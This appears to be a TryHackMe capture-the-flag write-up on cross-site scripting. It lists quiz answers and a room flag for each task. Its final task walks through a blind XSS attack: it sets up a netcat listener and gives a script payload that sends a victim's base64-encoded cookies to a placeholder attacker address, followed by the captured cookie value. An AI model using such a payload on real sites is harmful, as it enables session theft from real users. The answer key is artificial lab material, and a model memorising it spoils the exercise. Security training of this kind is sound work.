# Task 1 - Room Brief

R/ **Cross-site Scripting**

# Task 2 - XSS Payloads

Which document property could contain the user's session token?

R/ **document.cookie**

Which JavaScript method is often used as a Proof Of Concept?

R/ **alert**

# Task 3 - Reflected XSS


Where in an URL is a good place to test for reflected XSS?

R/ **Parameters**

# Task 4 -  Stored XSS 

R/ **Database**

# Task 5 - DOM Based XSS 


What unsafe JavaScript method is good to look for in source code?

R/ **eval()**

# Task 6 - Blind XSS 


What tool can you use to test for Blind XSS?

R/ **xsshunter**


What type of XSS is very similar to Blind XSS?

R/ **stored xss**

# Task 7 - Perfecting your payload

R/ **THM{XSS_MASTER}**

# Task 8 - Practical Example (Blind XSS)

First of all you need to create a listening port on your machine or TryHackMe AttackBox. Using the following command you will be able to set up the port: **nc -nlvp 9001**.

Then, you can execute the payload in order to get the victim's cookies. Payload: **</textarea><script>fetch('http:// YOUR MACHINE IP:9001?cookie=' + btoa(document.cookie));</script>**.

Finally, when the payload has been executed. You will receive the victim's cookies, which it will be encode on base64. Cookie value: **c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==**

To decode the cookie I used CyberChef site. Once decoded it you will get the response to complete the room.
